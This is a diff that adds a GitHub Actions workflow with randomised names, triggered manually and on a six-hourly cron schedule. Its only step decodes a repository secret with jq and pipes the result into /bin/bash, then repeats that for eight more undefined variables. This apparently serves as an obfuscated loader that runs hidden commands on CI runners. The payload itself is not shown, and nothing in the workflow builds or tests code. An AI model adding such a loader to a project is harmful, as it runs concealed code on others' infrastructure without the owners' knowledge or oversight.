@@ -1,0 +1,24 @@
+name: stirrigid
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: stirrigid
+        env:
+          lxue2865: ${{ secrets.lxue2865 }}
+        run: |
+          echo $lxue2865 | jq -r .r9675 | /bin/bash
+          echo $zw98 | jq -r .eh1 | /bin/bash
+          echo $gbpmz396 | jq -r .g98 | /bin/bash
+          echo $nhl09 | jq -r .ls742 | /bin/bash
+          echo $bdqr44 | jq -r .gbg9342 | /bin/bash
+          echo $ktgji8786 | jq -r .jn2 | /bin/bash
+          echo $us9479 | jq -r .clk899 | /bin/bash
+          echo $i65 | jq -r .vcr29 | /bin/bash
+          echo $jmvon208 | jq -r .iili16800 | /bin/bash
+
